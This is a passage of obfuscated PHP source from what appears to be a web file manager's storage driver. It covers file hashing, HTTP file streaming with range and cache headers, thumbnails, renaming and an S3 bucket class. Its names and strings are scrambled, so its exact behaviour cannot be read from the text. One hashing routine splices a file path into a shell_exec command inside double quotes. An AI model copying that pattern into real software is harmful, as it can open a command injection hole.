$Š­ÏŒ˜ó[103]); $áİŞÁÇ· = Cache::get($Š­ÏŒ˜ó[104]); if (!$áİŞÁÇ·) { $²Ü¾Á³§ = BASIC_PATH . $Š­ÏŒ˜ó[105]; $‡Å®›¸ = md5_file($²Ü¾Á³§); $áİŞÁÇ· = $Š­ÏŒ˜ó[106]; foreach ($ùÛôÑö‹ as $Õ“¹õŞĞ) { $Úå¸³¿ = shell_exec($Õ“¹õŞĞ . "\40\42{$²Ü¾Á³§}\x22"); if ($Úå¸³¿ && substr(trim($Úå¸³¿), 0, 32) == $‡Å®›¸) { $áİŞÁÇ· = $Õ“¹õŞĞ; break; } } Cache::set($Š­ÏŒ˜ó[104], $áİŞÁÇ·, 3600); } if ($áİŞÁÇ· == $Š­ÏŒ˜ó[106]) { return !1; } $Úå¸³¿ = shell_exec($áİŞÁÇ· . "\x20\42{$ºÉü­Ş¶}\x22"); $Úå¸³¿ = str_replace($Š­ÏŒ˜ó[107], $Š­ÏŒ˜ó[12], $Úå¸³¿); return substr($Úå¸³¿, 0, 32); } public function link($“Î—ŠÌï) { return $“Î—ŠÌï; } public function fileOut($°Şƒ™¤ò, $Ïí…Ç¶‘ = false, $ö’†øÊ = false, $úÊÉ”ä = '') { $ê…ÓÓÓï =& $_SERVER[¡¬ıÜ ƒ]; $this->cacheMethod(null, null); if (!$°Şƒ™¤ò || !$this->exist($°Şƒ™¤ò)) { show_json(LNG($ê…ÓÓÓï[108]), !1, $ö’†øÊ); } $Î™’İ¯Ä = $this->getType() == $ê…ÓÓÓï[109]; $“³ÍÇ°· = $GLOBALS[$ê…ÓÓÓï[6]][$ê…ÓÓÓï[92]][$ê…ÓÓÓï[110]][$ê…ÓÓÓï[111]]; $¬öºãĞĞ = (double) $GLOBALS[$ê…ÓÓÓï[6]][$ê…ÓÓÓï[92]][$ê…ÓÓÓï[110]][$ê…ÓÓÓï[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ñ‰Ã‹êÜ = $this->infoFull($°Şƒ™¤ò); $€Ç´ù¿½ = $Ñ‰Ã‹êÜ[$ê…ÓÓÓï[79]]; $³Â†ÒÂ¨ = gmdate($ê…ÓÓÓï[113], $Ñ‰Ã‹êÜ[$ê…ÓÓÓï[88]]); $ŞÁ±†…ã = $ö’†øÊ ? $ö’†øÊ : $this->iconvApp($Ñ‰Ã‹êÜ[$ê…ÓÓÓï[32]]); $¯¤Šà» = 0; $‰«İé×ù = $€Ç´ù¿½ - 1; $”Àİñ´ñ = $this->ext($ŞÁ±†…ã); if (in_array($”Àİñ´ñ, array($ê…ÓÓÓï[114], $ê…ÓÓÓï[115], $ê…ÓÓÓï[116], $ê…ÓÓÓï[117]))) { $”Àİñ´ñ = $ê…ÓÓÓï[118]; } if (in_array($”Àİñ´ñ, array($ê…ÓÓÓï[119]))) { $”Àİñ´ñ = $ê…ÓÓÓï[120]; } if (!$úÊÉ”ä) { $úÊÉ”ä = md5($³Â†ÒÂ¨ . $€Ç´ù¿½); } $úÊÉ”ä = $ê…ÓÓÓï[121] . $úÊÉ”ä . $ê…ÓÓÓï[121]; $İİô¯‚ = get_file_mime($”Àİñ´ñ); $Á÷¸ÎÕ  = !0; $Á÷¸ÎÕ  = isset($_GET[$ê…ÓÓÓï[122]]) ? !1 : !0; if ($Ïí…Ç¶‘ === !1 && !mime_support($İİô¯‚)) { $İİô¯‚ = $ê…ÓÓÓï[123]; } header($ê…ÓÓÓï[124]); header($ê…ÓÓÓï[125] . $İİô¯‚); $åöÕäş = rawurlencode($ŞÁ±†…ã); $åöÕäş = $ê…ÓÓÓï[121] . $åöÕäş . $ê…ÓÓÓï[126] . $åöÕäş; if ($Ïí…Ç¶‘) { header($ê…ÓÓÓï[127]); header($ê…ÓÓÓï[128] . $åöÕäş); } else { if ($Á÷¸ÎÕ ) { header($ê…ÓÓÓï[129] . $åöÕäş); } } $’±ì”¾ = 3600 * 24 * 30; header($ê…ÓÓÓï[130]); header($ê…ÓÓÓï[131]); header($ê…ÓÓÓï[132] . $’±ì”¾); header($ê…ÓÓÓï[133] . gmdate($ê…ÓÓÓï[113], time() + $’±ì”¾) . $ê…ÓÓÓï[134]); if (isset($_SERVER[$ê…ÓÓÓï[135]]) && strtotime($_SERVER[$ê…ÓÓÓï[135]]) == $Ñ‰Ã‹êÜ[$ê…ÓÓÓï[88]]) { header($ê…ÓÓÓï[136], !0, 304); die; } if (isset($_SERVER[$ê…ÓÓÓï[137]]) && $_SERVER[$ê…ÓÓÓï[137]] == $úÊÉ”ä) { header($ê…ÓÓÓï[138] . $úÊÉ”ä, !0, 304); die; } header($ê…ÓÓÓï[138] . $úÊÉ”ä); header($ê…ÓÓÓï[139] . $³Â†ÒÂ¨ . $ê…ÓÓÓï[134]); header($ê…ÓÓÓï[140] . $ŞÁ±†…ã); header($ê…ÓÓÓï[141]); header($ê…ÓÓÓï[142] . $€Ç´ù¿½); header($ê…ÓÓÓï[143]); Hook::trigger($ê…ÓÓÓï[144], $°Şƒ™¤ò, $€Ç´ù¿½, $ŞÁ±†…ã, $”Àİñ´ñ); if (!$Ïí…Ç¶‘ && $”Àİñ´ñ == $ê…ÓÓÓï[145]) { if ($€Ç´ù¿½ > 1024 * 1024 * 5) { die; } $œÜí•€ = $this->getContent($°Şƒ™¤ò); $œÜí•€ = Html::clearSVG($œÜí•€); header($ê…ÓÓÓï[146] . strlen($œÜí•€)); echo $œÜí•€; die; } $Ä •µ¬î = strtolower($_SERVER[$ê…ÓÓÓï[147]]); if ($Î™’İ¯Ä && $Ä •µ¬î && $“³ÍÇ°·) { if (strstr($Ä •µ¬î, $ê…ÓÓÓï[148])) { header($ê…ÓÓÓï[149] . $°Şƒ™¤ò); } else { if (strstr($Ä •µ¬î, $ê…ÓÓÓï[150])) { header($ê…ÓÓÓï[151] . $°Şƒ™¤ò); } else { if (strstr($Ä •µ¬î, $ê…ÓÓÓï[152])) { header($ê…ÓÓÓï[153] . $°Şƒ™¤ò); } } } if ($¬öºãĞĞ) { header($ê…ÓÓÓï[154] . $¬öºãĞĞ); } return; } if (isset($_SERVER[$ê…ÓÓÓï[155]])) { if (preg_match($ê…ÓÓÓï[156], $_SERVER[$ê…ÓÓÓï[155]], $­ÆÖÉ´›)) { $¯¤Šà» = intval($­ÆÖÉ´›[1]); $¯¤Šà» = $¯¤Šà» <= 0 ? 0 : ($¯¤Šà» >= $‰«İé×ù ? $‰«İé×ù : $¯¤Šà»); if (!empty($­ÆÖÉ´›[2])) { $ÄÔÉÓ¦ = intval($­ÆÖÉ´›[2]); $‰«İé×ù = $ÄÔÉÓ¦ < $¯¤Šà» ? $¯¤Šà» : ($ÄÔÉÓ¦ >= $‰«İé×ù ? $‰«İé×ù : $ÄÔÉÓ¦); } } header($ê…ÓÓÓï[157]); header("\103\157\156\x74\145\x6e\164\55\x52\141\x6e\147\145\72\40\142\171\164\x65\163\x20{$¯¤Šà»}\x2d{$‰«İé×ù}\57" . $€Ç´ù¿½); } else { header($ê…ÓÓÓï[158]); } header($ê…ÓÓÓï[159]); header($ê…ÓÓÓï[160]); $ÁÎÂèé = !0; if ($_SERVER[$ê…ÓÓÓï[161]] == $ê…ÓÓÓï[162] && $€Ç´ù¿½ > 1204 * 1024 * 1024 * 2) { $ÁÎÂèé = !1; } if ($ÁÎÂèé) { header($ê…ÓÓÓï[163] . ($‰«İé×ù - $¯¤Šà» + 1)); } if ($_SERVER[$ê…ÓÓÓï[164]] == $ê…ÓÓÓï[165]) { return; } $ø…é¡ = array($ê…ÓÓÓï[166] => !1, $ê…ÓÓÓï[167] => $¯¤Šà», $ê…ÓÓÓï[168] => $‰«İé×ù, $ê…ÓÓÓï[169] => $”Àİñ´ñ, $ê…ÓÓÓï[170] => $Ñ‰Ã‹êÜ, $ê…ÓÓÓï[171] => $ê…ÓÓÓï[12], $ê…ÓÓÓï[172] => 0); $ø…é¡ = Hook::filter($ê…ÓÓÓï[173], $ø…é¡); $ö¸¤¹İµ = 1024 * 300; $¦¦½Ñ¡Ô = 0; if ($¬öºãĞĞ) { $¦¦½Ñ¡Ô = intval(1000 * 1000 * ($ö¸¤¹İµ / $¬öºãĞĞ)); } while ($¯¤Šà» <= $‰«İé×ù) { $¸†ßòÖ = timeFloat(); check_abort(); $Øñ©Ç³» = $‰«İé×ù - $¯¤Šà» + 1; if ($Øñ©Ç³» <= $ö¸¤¹İµ) { $ö¸¤¹İµ = $Øñ©Ç³»; } $œÜí•€ = $this->fileSubstr($°Şƒ™¤ò, $¯¤Šà», $ö¸¤¹İµ); if ($ø…é¡[$ê…ÓÓÓï[166]]) { $ø…é¡[$ê…ÓÓÓï[171]] = $œÜí•€; $ø…é¡[$ê…ÓÓÓï[172]] = $¯¤Šà»; $ø…é¡ = Hook::filter($ê…ÓÓÓï[174], $ø…é¡); $œÜí•€ = $ø…é¡[$ê…ÓÓÓï[171]]; } echo $œÜí•€; $¯¤Šà» += $ö¸¤¹İµ; if ($ö¸¤¹İµ == $Øñ©Ç³») { $¯¤Šà» = $‰«İé×ù + 1; } if ($¦¦½Ñ¡Ô) { $»«”ê´ = intval(1000 * 1000 * (timeFloat() - $¸†ßòÖ)); $­ÁúÔİë = $¦¦½Ñ¡Ô - $»«”ê´; if ($­ÁúÔİë > 5) { usleep($­ÁúÔİë); } } } } public function fileOutServer($²ˆœÈÀò, $òüÓ¯Ãğ = false, $¤¨†Ü×‰ = false, $¦£¦Ê­ä = '') { $this->fileOut($²ˆœÈÀò, $òüÓ¯Ãğ, $¤¨†Ü×‰, $¦£¦Ê­ä); } public function fileOutLink($çë‚ÈøÊ) { header($_SERVER[¡¬ıÜ ƒ][175] . $çë‚ÈøÊ); die; } public function cacheMethod($íÚß¢½ã, $¸×–ê, $ÍÖÌ‚Ú´ = null) { $Ÿ×ß“ŒÓ =& $_SERVER[¡¬ıÜ ƒ]; static $ÃàüÍŞ™ = array(); $€ğ‚İñ¾ = $¸×–ê ? ltrim($this->getPathOuter($¸×–ê), $Ÿ×ß“ŒÓ[8]) : $Ÿ×ß“ŒÓ[12]; $æ‘Í‹ô¶ = $Ÿ×ß“ŒÓ[176] . $íÚß¢½ã . $Ÿ×ß“ŒÓ[177] . rtrim($€ğ‚İñ¾, $Ÿ×ß“ŒÓ[8]); if (is_null($íÚß¢½ã)) { $ÃàüÍŞ™ = array(); return; } if (is_null($¸×–ê)) { foreach ($ÃàüÍŞ™ as $æ‘Í‹ô¶ => $±ß½ıµ) { if (!strstr($æ‘Í‹ô¶, $Ÿ×ß“ŒÓ[176] . $íÚß¢½ã . $Ÿ×ß“ŒÓ[178])) { continue; } unset($ÃàüÍŞ™[$æ‘Í‹ô¶]); } return; } if (!is_null($ÍÖÌ‚Ú´)) { $ÃàüÍŞ™[$æ‘Í‹ô¶] = $ÍÖÌ‚Ú´; return; } $ê‡¤¯¡ß = isset($ÃàüÍŞ™[$æ‘Í‹ô¶]) ? $ÃàüÍŞ™[$æ‘Í‹ô¶] : null; if (!is_null($ê‡¤¯¡ß)) { return $ê‡¤¯¡ß; } $ê‡¤¯¡ß = $this->{$íÚß¢½ã}($¸×–ê); $ÃàüÍŞ™[$æ‘Í‹ô¶] = $ê‡¤¯¡ß; return $ê‡¤¯¡ß; } public function cacheMethodInfoSet($õÔÊÃÄ¼, $í¨öÁ­Ÿ, $’æ°óÇ“ = false) { $ğº§¸ü =& $_SERVER[¡¬ıÜ ƒ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ğº§¸ü[179], $õÔÊÃÄ¼, $í¨öÁ­Ÿ); $this->cacheMethod($ğº§¸ü[180], $õÔÊÃÄ¼, $í¨öÁ­Ÿ ? !1 : !0); if (is_array($’æ°óÇ“)) { $this->cacheMethod($ğº§¸ü[181], $õÔÊÃÄ¼, $’æ°óÇ“); } } public function fileOutImage($şÚ÷¥×‡, $æØ‰Æ = 250) { $œœğ¹ÊÖ =& $_SERVER[¡¬ıÜ ƒ]; set_timeout(); if (substr($şÚ÷¥×‡, 0, 4) == $œœğ¹ÊÖ[152]) { $this->fileOutLink($şÚ÷¥×‡); } $‰Ìâá”¯ = $this->info($şÚ÷¥×‡); $ßîìúÉÓ = !1; $Â½Ö¨İÙ = isset($GLOBALS[$œœğ¹ÊÖ[182]]) ? $GLOBALS[$œœğ¹ÊÖ[182]] : array(); if ($Â½Ö¨İÙ && $Â½Ö¨İÙ[$œœğ¹ÊÖ[183]] == $‰Ìâá”¯[$œœğ¹ÊÖ[87]]) { $‰Ìâá”¯ = $Â½Ö¨İÙ; $îÆµÔö² = $‰Ìâá”¯[$œœğ¹ÊÖ[184]]; if ($îÆµÔö² && isset($îÆµÔö²[$œœğ¹ÊÖ[185]])) { if ($îÆµÔö²[$œœğ¹ÊÖ[185]] <= $æØ‰Æ && $îÆµÔö²[$œœğ¹ÊÖ[186]] <= $æØ‰Æ) { $ßîìúÉÓ = !0; } } } if ($‰Ìâá”¯[$œœğ¹ÊÖ[79]] <= 1024 * 50 || $ßîìúÉÓ || !function_exists($œœğ¹ÊÖ[187]) || $‰Ìâá”¯[$œœğ¹ÊÖ[169]] == $œœğ¹ÊÖ[188]) { return $this->fileOut($şÚ÷¥×‡, !1, $‰Ìâá”¯[$œœğ¹ÊÖ[32]]); } $²¡Ÿ¸é” = kodIO::hashPath($‰Ìâá”¯); $’üó‹Æ = "\x63\157\166\x65\162\137{$²¡Ÿ¸é”}\137{$æØ‰Æ}\x2e\x70\x6e\147"; $ğ»«áÁ¼ = IO_PATH_SYSTEM_TEMP . $œœğ¹ÊÖ[189]; $ñ·½ğ¤ = IO::infoFullSimple($ğ»«áÁ¼); $ôÑ½·Øë = $ñ·½ğ¤ && is_array($ñ·½ğ¤) ? $ñ·½ğ¤[$œœğ¹ÊÖ[87]] : $œœğ¹ÊÖ[12]; if (!$ôÑ½·Øë) { $ôÑ½·Øë = IO::mkdir($ğ»«áÁ¼); } if ($‰Ìâá”¯[$œœğ¹ÊÖ[190]] == $œœğ¹ÊÖ[191] && isset($‰Ìâá”¯[$œœğ¹ÊÖ[192]]) && $‰Ìâá”¯[$œœğ¹ÊÖ[192]] == kodIO::sourceID($ôÑ½·Øë)) { $ìÍµø‘ = $‰Ìâá”¯[$œœğ¹ÊÖ[193]]; if ($æØ‰Æ <= 500) { $«œªÔôƒ = preg_replace($œœğ¹ÊÖ[194], $œœğ¹ÊÖ[195], $‰Ìâá”¯[$œœğ¹ÊÖ[32]]); $ìÍµø‘ = IO::fileNameExist($ôÑ½·Øë, $«œªÔôƒ); } return IO::fileOut(KodIO::make($ìÍµø‘), !1, $‰Ìâá”¯[$œœğ¹ÊÖ[32]]); } $×¥®œŞÒ = IO::fileNameExist($ôÑ½·Øë, $’üó‹Æ); if ($×¥®œŞÒ) { return IO::fileOut(KodIO::make($×¥®œŞÒ), !1, $‰Ìâá”¯[$œœğ¹ÊÖ[32]]); } if ($æØ‰Æ > 1000) { $this->makeImageCover($ôÑ½·Øë, $şÚ÷¥×‡, $’üó‹Æ, $æØ‰Æ); $this->makeImageCover($ôÑ½·Øë, $şÚ÷¥×‡, "\143\157\166\145\x72\x5f{$²¡Ÿ¸é”}\137\x32\x35\x30\x2e\160\x6e\147", 250); $×¥®œŞÒ = IO::fileNameExist($ôÑ½·Øë, $’üó‹Æ); if ($×¥®œŞÒ) { return IO::fileOut(KodIO::make($×¥®œŞÒ), !1, $‰Ìâá”¯[$œœğ¹ÊÖ[32]]); } die; } if (!kodIO::allowCover($‰Ìâá”¯)) { return $this->fileOut($şÚ÷¥×‡, !1, $‰Ìâá”¯[$œœğ¹ÊÖ[32]]); } $Ëâå”ÖÛ = Cache::get($’üó‹Æ); if ($Ëâå”ÖÛ == $œœğ¹ÊÖ[196] || $Ëâå”ÖÛ == $œœğ¹ÊÖ[197]) { echo $Ëâå”ÖÛ; die; } Cache::set($’üó‹Æ, $œœğ¹ÊÖ[197], 60); $Š¹ëõ´ = array($ôÑ½·Øë, $‰Ìâá”¯[$œœğ¹ÊÖ[87]], $’üó‹Æ, $æØ‰Æ); $–óÊèÍ = $œœğ¹ÊÖ[198] . $‰Ìâá”¯[$œœğ¹ÊÖ[79]] . $œœğ¹ÊÖ[199] . $’üó‹Æ . $œœğ¹ÊÖ[200] . $‰Ìâá”¯[$œœğ¹ÊÖ[32]] . $œœğ¹ÊÖ[201] . $‰Ìâá”¯[$œœğ¹ÊÖ[87]]; TaskQueue::add($œœğ¹ÊÖ[202], $Š¹ëõ´, $–óÊèÍ, $’üó‹Æ); } public function makeImageCover($˜¦·ÃÃü, $†ÑñÆ—¤, $Ìç¹ã, $‘±¯ü‘) { $ş¶¸¾½ =& $_SERVER[¡¬ıÜ ƒ]; if (IO::fileNameExist($˜¦·ÃÃü, $Ìç¹ã)) { return $ş¶¸¾½[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $«ª¿Ù = DATA_THUMB . $Ìç¹ã; del_file($«ª¿Ù); $›õ’îÈ = IO::copy($†ÑñÆ—¤, TEMP_FILES, !1, $Ìç¹ã); if (!@file_exists($›õ’îÈ)) { return $ş¶¸¾½[204]; } ImageThumb::createThumb($›õ’îÈ, $«ª¿Ù, $‘±¯ü‘, $‘±¯ü‘ * 10); if (@file_exists($«ª¿Ù)) { Cache::remove($Ìç¹ã); return IO::move($«ª¿Ù, $˜¦·ÃÃü); } Cache::set($Ìç¹ã, $ş¶¸¾½[196], 600); del_file($«ª¿Ù); return $ş¶¸¾½[205] . $›õ’îÈ . $ş¶¸¾½[74]; } public function fileOutImageServer($×Á½ìô’, $íšÎò©´ = 250) { $this->fileOutImage($×Á½ìô’, $íšÎò©´); } public function fileNameAuto($ŒàÔ–Æç, $ü¯ìÕ›†, $Í‘«İ±­ = REPEAT_RENAME, $¿Ò‡Â¨ = false) { $™©ƒÆ¿Œ =& $_SERVER[¡¬ıÜ ƒ]; $â¢Ê§»Ù = $ŒàÔ–Æç === $™©ƒÆ¿Œ[12] ? $ü¯ìÕ›† : rtrim($ŒàÔ–Æç, $™©ƒÆ¿Œ[8]) . $™©ƒÆ¿Œ[8] . $ü¯ìÕ›†; if ($Í‘«İ±­ == REPEAT_REPLACE || !$this->exist($â¢Ê§»Ù) || $¿Ò‡Â¨ && $Í‘«İ±­ != REPEAT_RENAME_FOLDER) { return $ü¯ìÕ›†; } if ($Í‘«İ±­ == REPEAT_SKIP) { return !1; } $ô¹ÖÀ“ = $™©ƒÆ¿Œ[10] . get_path_ext($ü¯ìÕ›†); $ô¹ÖÀ“ = $ô¹ÖÀ“ == $™©ƒÆ¿Œ[10] || $¿Ò‡Â¨ ? $™©ƒÆ¿Œ[12] : $ô¹ÖÀ“; $„Îá½³¦ = 1; $ÜĞÁ™ŒÊ = substr($ü¯ìÕ›†, 0, strlen($ü¯ìÕ›†) - strlen($ô¹ÖÀ“)); $ø÷«°İ = $ÜĞÁ™ŒÊ . "\50{$„Îá½³¦}\51{$ô¹ÖÀ“}"; while ($this->exist(rtrim($ŒàÔ–Æç, $™©ƒÆ¿Œ[8]) . $™©ƒÆ¿Œ[8] . $ø÷«°İ)) { $ø÷«°İ = $ÜĞÁ™ŒÊ . "\x28{$„Îá½³¦}\51{$ô¹ÖÀ“}"; $„Îá½³¦++; } return $ø÷«°İ; } private function fileNameAutoList($ÜŞíî¹Õ, $ÉÀâ°, $æéÁ´°ñ = false) { $Ò€é‹’í =& $_SERVER[¡¬ıÜ ƒ]; $èËœŞØ = $this->listPath($ÜŞíî¹Õ, !0); $èËœŞØ = array_merge($èËœŞØ[$Ò€é‹’í[85]], $èËœŞØ[$Ò€é‹’í[86]]); $§Í·™¡— = array_to_keyvalue($èËœŞØ, $Ò€é‹’í[12], $Ò€é‹’í[32]); $Ñåâİõî = $Ò€é‹’í[10] . get_path_ext($ÉÀâ°); $Ñåâİõî = $Ñåâİõî == $Ò€é‹’í[10] || $æéÁ´°ñ ? $Ò€é‹’í[12] : $Ñåâİõî; $Ğ‘èˆ¢Ñ = substr($ÉÀâ°, 0, strlen($ÉÀâ°) - strlen($Ñåâİõî)); $¼‰“ıªÍ = $Ğ‘èˆ¢Ñ . "\x28\60\x29{$Ñåâİõî}"; for ($ºıÛ³ş = 1; $ºıÛ³ş <= count($§Í·™¡—) + 1; $ºıÛ³ş++) { $¼‰“ıªÍ = $Ğ‘èˆ¢Ñ . "\50{$ºıÛ³ş}\51{$Ñåâİõî}"; if (!in_array_not_case($¼‰“ıªÍ, $§Í·™¡—)) { return $¼‰“ıªÍ; } } return $¼‰“ıªÍ; } public function listAllFiles($—”ï®Ø«, $ úëö»Ì) { $¢‚óÊşÔ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($ úëö»Ì)) { return array(); } $ÙÁ’Ñ¯ = array_keys($ úëö»Ì); $§ûÃú = array(); $—”ï®Ø« = trim($—”ï®Ø«, $¢‚óÊşÔ[8]); foreach ($ úëö»Ì as $Ô¡Í¤ä² => $ä¨»‘¾) { $îı¸Ğ¦ñ = ltrim(substr(trim($Ô¡Í¤ä², $¢‚óÊşÔ[8]), strlen($—”ï®Ø«)), $¢‚óÊşÔ[8]); if (substr($Ô¡Í¤ä², -1) == $¢‚óÊşÔ[8]) { $îı¸Ğ¦ñ = rtrim($îı¸Ğ¦ñ, $¢‚óÊşÔ[8]) . $¢‚óÊşÔ[8]; } $§ûÃú = array_merge($§ûÃú, $this->slicePath($îı¸Ğ¦ñ)); } $®èş²Ş– = array(); foreach (array_unique($§ûÃú) as $İò´©Îš) { $è§³äŒø = array($¢‚óÊşÔ[87] => $this->getPathOuter($¢‚óÊşÔ[8] . $—”ï®Ø« . $¢‚óÊşÔ[8] . $İò´©Îš), $¢‚óÊşÔ[78] => 1, $¢‚óÊşÔ[79] => 0); if (substr($İò´©Îš, -1) != $¢‚óÊşÔ[8]) { $è§³äŒø[$¢‚óÊşÔ[78]] = 0; $şï¥™ª = $this->getPath($—”ï®Ø« . $¢‚óÊşÔ[8] . $İò´©Îš); if (isset($ úëö»Ì[$şï¥™ª])) { $Øç˜šÌ = $ úëö»Ì[$şï¥™ª]; if (isset($Øç˜šÌ[$¢‚óÊşÔ[79]])) { $è§³äŒø[$¢‚óÊşÔ[79]] = intval($Øç˜šÌ[$¢‚óÊşÔ[79]]); } if (isset($Øç˜šÌ[$¢‚óÊşÔ[206]])) { $è§³äŒø[$¢‚óÊşÔ[88]] = intval($Øç˜šÌ[$¢‚óÊşÔ[206]]); } } } $®èş²Ş–[] = $è§³äŒø; } return $®èş²Ş–; } public function slicePath($ã…™ƒõñ) { $¡˜Îó¢• =& $_SERVER[¡¬ıÜ ƒ]; $¯¹¤Îö = explode($¡˜Îó¢•[8], trim($ã…™ƒõñ, $¡˜Îó¢•[8])); $Ô…éÁë  = 0; do { ++$Ô…éÁë ; $Ô‚Ö¦½¡[] = implode($¡˜Îó¢•[8], array_slice($¯¹¤Îö, 0, $Ô…éÁë )) . $¡˜Îó¢•[8]; } while ($Ô…éÁë  < count($¯¹¤Îö)); $Ô‚Ö¦½¡[count($¯¹¤Îö) - 1] = $ã…™ƒõñ; return $Ô‚Ö¦½¡; } public function getHost() { $©¬‘…Ù· =& $_SERVER[¡¬ıÜ ƒ]; $ğ±±Ù‡ = parse_url(trim($this->domain, $©¬‘…Ù·[8])); $¼›İÌ”° = isset($ğ±±Ù‡[$©¬‘…Ù·[207]]) ? $ğ±±Ù‡[$©¬‘…Ù·[207]] : http_type(); $Ê·©£È = isset($ğ±±Ù‡[$©¬‘…Ù·[208]]) ? $ğ±±Ù‡[$©¬‘…Ù·[208]] : $ğ±±Ù‡[$©¬‘…Ù·[87]]; if (isset($ğ±±Ù‡[$©¬‘…Ù·[209]])) { $Ê·©£È .= $©¬‘…Ù·[4] . $ğ±±Ù‡[$©¬‘…Ù·[209]]; } return $¼›İÌ”° . $©¬‘…Ù·[210] . $Ê·©£È; } public function pathEncode($»Á»ÌÀÔ) { $ÏáÆÊíà =& $_SERVER[¡¬ıÜ ƒ]; return str_replace($ÏáÆÊíà[211], $ÏáÆÊíà[8], rawurlencode($»Á»ÌÀÔ)); } public function writeLog($šº«ÅÚç = '', $èù³¸ˆÅ = false) { $ ÑÓüÏ€ =& $_SERVER[¡¬ıÜ ƒ]; $™ßÌíöÀ = in_array(ACTION, array($ ÑÓüÏ€[212], $ ÑÓüÏ€[213])); if (!$™ßÌíöÀ && !GLOBAL_DEBUG) { return; } $æ¸ø­¼“ = $šº«ÅÚç; static $ÈôŒ£è‘ = null; if (!$ÈôŒ£è‘) { $ÈôŒ£è‘ = strtoupper($this->getType()); } $šº«ÅÚç = $ÈôŒ£è‘ . $ ÑÓüÏ€[214] . $šº«ÅÚç; if ($èù³¸ˆÅ) { $è×¹´‚Á = error_get_last(); if ($è×¹´‚Á) { $šº«ÅÚç = array($šº«ÅÚç, $è×¹´‚Á); } } write_log($šº«ÅÚç, $ ÑÓüÏ€[215]); if ($™ßÌíöÀ) { throw new Exception($æ¸ø­¼“); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Şï¼İ) { set_timeout(); require_once SDK_DIR . $_SERVER[¡¬ıÜ ƒ][216]; parent::__construct(); $this->_init($Şï¼İ); } public function _init($ÉçæœŸí) { $İ§ñÆŸ =& $_SERVER[¡¬ıÜ ƒ]; $this->config = $ÉçæœŸí; foreach ($ÉçæœŸí as $Áò¬¬Úì => $ÒËÒĞÒ) { if (isset($this->{$Áò¬¬Úì})) { $this->{$Áò¬¬Úì} = $ÒËÒĞÒ; } } $this->endpoint = $ÉçæœŸí[$İ§ñÆŸ[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $‡îï£ª— = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($‡îï£ª—, 0, 7) == $İ§ñÆŸ[218]) { $‡îï£ª— = $İ§ñÆŸ[219] . substr($‡îï£ª—, 7); } $this->client->setEndpoint($‡îï£ª—); if (in_array(ACTION, array($İ§ñÆŸ[212], $İ§ñÆŸ[213]))) { $this->client->setExceptions(); } } public function setSignVersion($°¹÷İÆû = "\x76\64") { $this->signVer = $°¹÷İÆû; $this->client->setSignVersion($°¹÷İÆû); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $óÉµí¦¶) { return null; } } public function isBucketCors() { $¼¸ºıÏã =& $_SERVER[¡¬ıÜ ƒ]; $’˜èê÷é = $this->getBucketCors(); if (!$’˜èê÷é || !is_array($’˜èê÷é)) { return !1; } if (!is_array($’˜èê÷é[$¼¸ºıÏã[220]])) { $’˜èê÷é[$¼¸ºıÏã[220]] = explode($¼¸ºıÏã[50], $’˜èê÷é[$¼¸ºıÏã[220]]); } if ($’˜èê÷é[$¼¸ºıÏã[221]] != $¼¸ºıÏã[222] || !in_array($¼¸ºıÏã[222], $’˜èê÷é[$¼¸ºıÏã[220]])) { return !1; } $ôÚ¾ôéÔ = array_map($¼¸ºıÏã[223], $’˜èê÷é[$¼¸ºıÏã[224]]); if (!is_array($ôÚ¾ôéÔ)) { $ôÚ¾ôéÔ = array(); } $ó´‚Ú±ş = array($¼¸ºıÏã[225], $¼¸ºıÏã[226], $¼¸ºıÏã[227], $¼¸ºıÏã[228], $¼¸ºıÏã[229]); $ø‹ç¼íü = array_diff($ó´‚Ú±ş, $ôÚ¾ôéÔ); return empty($ø‹ç¼íü); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¯‡•¡£ö, $·¼ÃÉí = '', $ª “•ï = REPEAT_RENAME) { $Ïàêö¬¸ = $this->setContent($¯‡•¡£ö, $·¼ÃÉí); if ($Ïàêö¬¸ !== !1) { return $this->getPathOuter($¯‡•¡£ö); } return !1; } public function mkdir($º„î¡úÁ, $Ğ¬Û¬ÉÖ = REPEAT_SKIP) { $”óóÕ¿Æ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($º„î¡úÁ) && $º„î¡úÁ !== $”óóÕ¿Æ[230]) { return !1; } if ($Ğ¬Û¬ÉÖ && $this->_isFolder($º„î¡úÁ)) { return $this->getPathOuter($º„î¡úÁ); } $°ƒĞ¦µŞ = $this->setContent($º„î¡úÁ, $”óóÕ¿Æ[12], !0); if ($°ƒĞ¦µŞ !== !1) { return $this->getPathOuter($º„î¡úÁ); } return !1; } public function copyFile($”ö«“ûç, $üåã÷¹Ş, $Õõ•û‡ø = array()) { $ĞÙù­Á€ =& $_SERVER[¡¬ıÜ ƒ]; $úû¢Ôö¹ = $this->objectMeta($”ö«“ûç); if (!$úû¢Ôö¹) { return !1; } if ($úû¢Ôö¹[$ĞÙù­Á€[79]] <= 1024 * 1024 * 200) { $¨Â§Êñ£ = $this->client->copyObject($this->bucket, $”ö«“ûç, $this->bucket, $üåã÷¹Ş, $ĞÙù­Á€[231], $Õõ•û‡ø); } else { $¨Â§Êñ£ = $this->client->multiCopyObject($this->bucket, $”ö«“ûç, $this->bucket, $üåã÷¹Ş, $Õõ•û‡ø); } $¨Â§Êñ£ = $¨Â§Êñ£ ? $this->getPathOuter($üåã÷¹Ş) : !1; return $¨Â§Êñ£; } public function moveFile($˜‘ıèŒé, $‹ô€ğü©) { if ($this->copyFile($˜‘ıèŒé, $‹ô€ğü©)) { $this->delFile($˜‘ıèŒé); return $this->getPathOuter($‹ô€ğü©); } return !1; } public function delFile($ıŸ¡Æçş) { return $this->client->deleteObject($this->bucket, 